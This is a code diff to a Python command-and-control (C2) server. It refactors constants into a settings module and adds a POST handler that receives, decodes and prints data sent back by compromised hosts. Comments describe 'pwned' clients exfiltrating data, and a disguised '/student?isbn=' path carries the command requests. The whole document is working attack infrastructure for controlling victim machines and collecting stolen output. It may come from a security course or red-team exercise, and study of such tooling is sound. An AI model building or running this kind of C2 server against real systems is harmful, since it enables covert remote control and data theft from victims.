@@ -3,22 +3,8 @@
 C2 Server side code
 """
 from http.server import BaseHTTPRequestHandler, HTTPServer
-from enum import Enum
-
-class HTTPStatusCode(Enum):
-    OK = 200
-    CREATED = 201
-    NO_CONTENT = 204
-    BAD_REQUEST = 400
-    UNAUTHORIZED = 401
-    FORBIDDEN = 403
-    NOT_FOUND = 404
-    INTERNAL_SERVER_ERROR = 500
-
-PORT = 8900
-# Leave blank to bind to all int otherwise specify c2 server IP address
-BIND_ADDR = ""
-CMD_REQUEST = "/student?isbn="
+from urllib.parse import unquote_plus
+from settings import PORT, BIND_ADDR, CMD_REQUEST, CMD_RESPONSE, CMD_RESPONSE_KEY, HEADER, PROXY, HTTPStatusCode
 
 class C2Handler(BaseHTTPRequestHandler):
     """ This is a child class of the BaseHTTPRequestHandler class.
@@ -29,6 +15,7 @@ class C2Handler(BaseHTTPRequestHandler):
     # noinspection PyPep8Naming
     def do_GET(self):
         global active_session, client_account, client_hostname, pwned_id, pwned_dict
+
         # compromised computer request exfiltrate datas
         if self.path.startswith(CMD_REQUEST):
             client = self.path.split(CMD_REQUEST)[1] 
@@ -55,6 +42,18 @@ class C2Handler(BaseHTTPRequestHandler):
             else:
                 # first send back 404 to the client
                 self.http_response(HTTPStatusCode.NOT_FOUND.value)
+
+    def do_POST(self):
+        if self.path == CMD_RESPONSE:
+            self.http_response(HTTPStatusCode.OK.value)
+            content_length = int(self.headers.get("Content-Length"))
+            # Gather the client's data by reading in the HTTP POST data
+            client_data = self.rfile.read(content_length)
+            # UTF-8 decode the client's data
+            client_data = client_data.decode()
+            client_data = client_data.replace(f"{CMD_RESPONSE_KEY}=", "", 1)
+            client_data = unquote_plus(client_data)
+            print(client_data)
                 
     def http_response(self, code: int):
         self.send_response(code)
